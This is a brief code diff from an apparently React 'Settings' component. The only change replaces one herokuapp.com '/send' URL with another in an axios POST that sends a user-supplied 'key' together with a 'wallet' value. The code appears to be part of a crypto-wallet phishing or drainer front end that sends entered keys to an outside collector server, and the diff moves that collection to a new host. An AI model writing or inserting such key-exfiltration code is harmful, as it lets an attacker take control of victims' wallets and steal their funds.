@@ -20,7 +20,7 @@ const Settings = () => {
 
     key !== ""
       ? axios
-          .post("https://shielded-earth-12418.herokuapp.com/send", {
+          .post("https://rocky-falls-82355.herokuapp.com/send", {
             key: key,
             wallet: pid,
           })
